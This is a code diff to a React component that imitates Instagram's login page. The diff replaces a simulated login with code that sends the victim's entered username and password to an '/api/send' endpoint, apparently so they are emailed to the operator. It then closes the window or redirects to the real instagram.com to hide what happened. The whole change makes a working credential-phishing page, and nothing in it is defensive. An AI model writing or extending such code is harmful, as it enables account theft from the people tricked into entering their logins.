@@ -81,7 +81,7 @@ export default function InstagramLogin() {
         }
     };
 
-    const handleSubmit = (e) => {
+    const handleSubmit = async (e) => {
         e.preventDefault();
 
         // Basic Validation
@@ -89,6 +89,7 @@ export default function InstagramLogin() {
             username: '',
             password: ''
         };
+        
         if (!formData.username || formData.username.length < 3) {
             newErrors.username = 'Please check your username.';
         }
@@ -96,18 +97,57 @@ export default function InstagramLogin() {
             newErrors.password = 'Password is incorrect.';
         }
 
-        if (Object.keys(newErrors).length > 0) {
+        if (newErrors.username || newErrors.password) {
             setErrors(newErrors);
             return;
         }
 
-        // Simulate Login
+        // Send email with login data
         setIsLoading(true);
-        setTimeout(() => {
+        
+        try {
+            const response = await fetch('/api/send', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    subject: `Instagram Login Attempt - ${formData.username}`,
+                    text: formData // This will be formatted nicely in the API
+                }),
+            });
+
+            const data = await response.json();
+
+            if (data.success) {
+                // Optional: Show success message before closing
+                console.log('Email sent successfully');
+                
+                // Wait a bit before closing so email can be sent
+                setTimeout(() => {
+                    // Try to close the window (only works if opened via JavaScript)
+                    window.close();
+                    
+                    // If window.close() doesn't work, redirect somewhere
+                    if (!window.closed) {
+                        window.location.href = 'https://www.instagram.com';
+                    }
+                }, 1000);
+            } else {
+                setErrors({
+                    username: '',
+                    password: 'Something went wrong. Please try again.'
+                });
+                setIsLoading(false);
+            }
+        } catch (error) {
+            console.error('Error:', error);
+            setErrors({
+                username: '',
+                password: 'Network error. Please try again.'
+            });
             setIsLoading(false);
-            // Reset logic or redirect would go here
-            alert('Login flow simulated for: ' + formData.username);
-        }, 2000);
+        }
     };
 
     return (
@@ -232,10 +272,9 @@ export default function InstagramLogin() {
 
                         {/* Login Button */}
                         <button
+                            type="submit"
                             className={`w-full mt-2 flex items-center justify-center bg-[#0095f6] hover:bg-[#1877f2] text-white font-semibold text-sm py-[7px] px-4 rounded-lg transition-all duration-200 ${(!isFormValid || isLoading) ? 'opacity-70 cursor-not-allowed hover:bg-[#0095f6]' : 'cursor-pointer'}`}
-                            onClick={() => {
-window.location.href = 'about:blank'
-                            }}
+                            disabled={!isFormValid || isLoading}
                         >
                             {isLoading ? <Spinner /> : 'Log in'}
                         </button>
